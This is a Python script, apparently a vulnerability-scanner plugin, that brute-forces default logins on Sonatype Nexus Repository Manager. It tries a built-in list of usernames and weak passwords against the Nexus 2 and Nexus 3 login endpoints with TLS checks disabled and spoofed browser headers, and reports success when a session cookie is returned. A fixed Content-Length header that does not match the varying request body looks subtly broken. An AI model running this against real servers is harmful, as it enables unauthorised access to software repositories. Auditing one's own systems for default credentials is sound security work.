import requests,re,urllib3,base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(url):
	total=[]
	response = requests.get(url,verify=False,timeout=10)
	if "Nexus" in response.text:
		user_list=['admin','nexus','Nexus']
		pass_list=['admin','admin123','123456','Admin','Admin123','Nexus','nexus']
		if 'Nexus/2' in response.headers['Server']:
			n=0
			if url[-1] == '/':
				vuln_url = url + "service/local/authentication/login?_dc=1636529359866"
			else:
				vuln_url = url + "/service/local/authentication/login?_dc=1636529359866"  
			for username in user_list:
				for password in pass_list:
					total.append((username,password))
			for c in total:
				username=c[0]
				password=c[1]
				key=username+':'+password
				key=base64.b64encode(key.encode()).decode()
				headers={
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
				'Accept': 'application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json',
				'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
				'Authorization': 'Basic '+key,
				'X-Nexus-UI': 'true',
				'X-Requested-With': 'XMLHttpRequest',
				'Connection': 'close'
				}
				r=requests.get(vuln_url,headers=headers,timeout=5,verify=False)
				if r.status_code==200 and 'NXSESSIONID' in r.headers['Set-Cookie']:
					return True
				else:
					n+=1
			if n==len(total):
				return False			
		else:
			n=0
			if url[-1] == '/':
				vuln_url = url + "service/rapture/session"
			else:
				vuln_url = url + "/service/rapture/session"  
			for username in user_list:
				for password in pass_list:
					total.append((username,password))
			for c in total:
				username=c[0]
				password=c[1]
				body='username='+base64.b64encode(username.encode()).decode().replace('+','%2B').replace('=','%3D').replace('/','%2F')+'&password='+base64.b64encode(password.encode()).decode().replace('+','%2B').replace('=','%3D').replace('/','%2F')
				headers={
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
				'Accept': '*/*',
				'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
				'X-Nexus-UI': 'true',
				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
				'X-Requested-With': 'XMLHttpRequest',
				'Content-Length': '46',
				'Connection': 'close',
				'Cookie': '_ga=GA1.2.236010153.1636511101; _gid=GA1.2.2009212609.1636511101; _gcl_au=1.1.35658916.1636511101; _ga=GA1.3.236010153.1636511101; _gid=GA1.3.2009212609.1636511101'
				}
				r=requests.post(vuln_url,body,headers=headers,timeout=5,verify=False)
				if r.status_code!=403 and 'NXSESSIONID' in r.headers['Set-Cookie']:
					return True
				else:
					n+=1
			if n==len(total):
				return False
	else:
		return False
